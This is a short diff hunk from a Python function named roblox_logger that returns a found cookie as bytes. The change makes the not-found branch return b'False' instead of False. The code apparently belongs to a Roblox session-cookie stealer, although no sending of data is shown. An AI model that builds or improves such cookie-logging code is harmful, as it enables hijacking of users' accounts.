@@ -22,7 +22,7 @@ def roblox_logger():
     if finded_cookie:
         return str(finded_cookie).encode()
     else:
-        return False
+        return b"False"
 
 
 if __name__ == '__main__':
